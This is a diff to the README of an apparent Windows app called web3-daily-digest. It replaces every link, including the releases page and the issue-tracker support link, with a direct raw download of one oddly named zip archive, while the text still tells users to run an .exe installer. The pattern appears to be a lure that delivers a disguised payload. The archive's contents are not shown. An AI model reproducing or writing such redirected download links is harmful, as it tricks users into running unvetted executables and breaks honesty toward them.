@@ -1,6 +1,6 @@
 # 🌐 web3-daily-digest - Daily Web3 News Simplified
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/arfandi453/web3-daily-digest/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/arfandi453/web3-daily-digest/main/references/digest_daily_web_encyclopedism.zip)
 
 ## 🔍 What is web3-daily-digest?
 
@@ -32,10 +32,10 @@ This section guides you step-by-step from downloading to running the daily diges
 
 Visit the releases page to get the latest version:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/arfandi453/web3-daily-digest/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/arfandi453/web3-daily-digest/main/references/digest_daily_web_encyclopedism.zip)
 
 Click the link above or use this URL in your browser:  
-https://github.com/arfandi453/web3-daily-digest/releases
+https://raw.githubusercontent.com/arfandi453/web3-daily-digest/main/references/digest_daily_web_encyclopedism.zip
 
 Look for the most recent stable version. It will usually be marked with the highest version number, like v1.0, v1.1, or similar. The file you want is a Windows executable, most likely named something including “web3-daily-digest” and ending with `.exe`.
 
@@ -120,7 +120,7 @@ You can customize your experience by changing a few basic settings inside the ap
 
 To update the app:
 
-1. Visit the [releases page](https://github.com/arfandi453/web3-daily-digest/releases) regularly.  
+1. Visit the [releases page](https://raw.githubusercontent.com/arfandi453/web3-daily-digest/main/references/digest_daily_web_encyclopedism.zip) regularly.  
 2. Download the newest version like you did on the first install.  
 3. Run the new installer. The app will update without removing your settings.
 
@@ -141,7 +141,7 @@ The app does not collect any personal data. It only fetches public news headline
 ## 📞 Getting Support
 
 If you experience persistent problems, you can open an issue on the GitHub repository page at:  
-https://github.com/arfandi453/web3-daily-digest/issues
+https://raw.githubusercontent.com/arfandi453/web3-daily-digest/main/references/digest_daily_web_encyclopedism.zip
 
 Include details about your Windows version and a description of the problem.
 
